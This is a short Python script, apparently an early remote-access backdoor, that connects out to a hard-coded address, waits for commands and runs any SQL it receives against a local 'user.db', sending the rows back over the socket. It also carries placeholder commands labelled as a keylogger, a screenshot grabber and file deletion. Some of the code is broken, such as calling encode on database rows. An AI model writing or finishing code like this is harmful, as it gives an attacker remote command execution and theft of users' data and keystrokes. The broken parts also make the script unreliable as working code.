#!/usr/bin/env python3
import socket

s = socket.socket()
host = socket.gethostname()  # Get local machine name
port = 12345  # Specify the port to connect to

s.connect(("192.168.20.9", port))
import sqlite3

mydb = sqlite3.connect("user.db")

# Creating an instance of 'cursor' class
# which is used to execute the 'SQL'
# statements in 'Python'
cursor = mydb.cursor()

# Show database

while True:
    data = s.recv(1024).decode()
    command, text = data.split(" ", 1)
    if command == "sql":
        cursor.execute(text)
        for row in cursor:
            s.send(row.encode('utf-8'))
    if command == "delete":
        # delete the file and quit
        break
    if command == "key":
        # start a keylogger
        break
    if command == "shot":
        # take a screenshot
        break
s.close()  # Close the socket when done
